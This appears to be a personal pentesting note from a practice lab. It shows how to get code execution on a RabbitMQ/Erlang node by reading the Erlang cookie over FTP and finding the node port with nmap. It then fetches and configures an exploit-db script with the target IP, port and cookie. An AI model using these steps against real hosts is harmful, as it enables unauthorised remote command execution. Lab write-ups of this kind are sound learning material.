# RabbitMQ / Erlang Port Dameon

I encountered this on clyde OSPG.

[4369 - Pentesting Erlang Port Mapper Daemon (epmd)](https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#manual)

To exploit this, I had ftp access that allowed me to find the cookie for Erlang at `/var/lib/rabbitmq/.erlang.cookie`. The cookie `.erlang.cookie` is usually located at `~/.erlang.cookie`. AKA the installation directory of rabbitmq/erlang.

![Untitled](RabbitMQ%20Erlang%20Port%20Dameon%20440d4f9ba1074d0d8bebc40f76321c44/Untitled.png)

Then find the port that the erlang node is running on. You can discover this with `nmap`

```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info  192.168.96.68 -oN epmd-info.nmap
```

or you can try the manual way

```bash
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```

In my case, it is port 65000

![Untitled](RabbitMQ%20Erlang%20Port%20Dameon%20440d4f9ba1074d0d8bebc40f76321c44/Untitled%201.png)

Get the python script to get code execution from exploit-db

```bash
searchsploit -m multiple/remote/49418.py
```

Then, modify the code to update the target ip and port of the node like this

![Untitled](RabbitMQ%20Erlang%20Port%20Dameon%20440d4f9ba1074d0d8bebc40f76321c44/Untitled%202.png)

```bash
TARGET = "192.168.96.68"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
CMD = "whoami"
```

Finally, run the python script to execute your commands

# Ignore this:

*****************The following results in code execution of your local machine (not the target machine). Thought I would leave it in in case it is somehow useful to future me*****************

To get code execution (RCE), I did this

```bash
HOME=/ erl -sname anonymous -setcookie JPCGJCAEWHPKKPBXBYYB
(anonymous@kali)3> os:cmd("id").
```

![Untitled](RabbitMQ%20Erlang%20Port%20Dameon%20440d4f9ba1074d0d8bebc40f76321c44/Untitled%203.png)